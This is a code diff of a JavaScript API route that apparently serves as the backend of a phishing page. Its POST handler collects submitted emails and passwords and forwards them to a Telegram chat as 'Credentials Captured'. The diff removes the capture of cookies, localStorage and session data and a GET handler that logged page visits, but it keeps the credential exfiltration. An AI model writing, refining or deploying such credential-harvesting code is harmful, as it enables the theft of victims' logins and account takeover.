@@ -12,11 +12,11 @@ const chatId = "6785104147";
 
 // Handle POST requests for form submissions
 export async function POST(req) {
-  const { email, password, userAgent, remoteAddress, landingUrl, cookies, localStorageData, sessionStorageData } = await req.json();
+  const { email, password } = await req.json();
 
   try {
     // Only send notification when password is provided (credentials)
-    if (password) {
+    if (password && email) {
       const credentialsMessage = `
 🔐 *Credentials Captured*
 
@@ -60,45 +60,13 @@ export async function POST(req) {
   }
 }
 
-// Handle GET requests - Now with notifications for page access
-export async function GET(req) {
-  try {
-    const url = new URL(req.url);
-    
-    // Send Telegram notification for page access
-    const pageAccessMessage = `
-🌐 *Page Accessed*
-
-*Access Time:*
-${new Date().toLocaleString()}
-
-🌐 *Landing URL:*
-${req.url || 'No URL provided'}
-
-👤 *User Agent:*
-${req.headers.get('user-agent') || 'Not available'}
-    `;
-
-    await bot.sendMessage({
-      text: pageAccessMessage,
-      chatId: chatId,
-      parse_mode: "Markdown"
-    });
-
-    console.log("Page accessed");
-    
-    return new Response(
-      JSON.stringify({ message: "Access logged!" }),
-      {
-        status: 200,
-        headers: { "Content-Type": "application/json" },
-      }
-    );
-  } catch (error) {
-    console.error("Error processing request:", error);
-    return new Response(JSON.stringify({ error: "Error processing request" }), {
-      status: 500,
+// Handle GET requests - return simple response
+export async function GET() {
+  return new Response(
+    JSON.stringify({ message: "API is running" }),
+    {
+      status: 200,
       headers: { "Content-Type": "application/json" },
-    });
-  }
+    }
+  );
 }
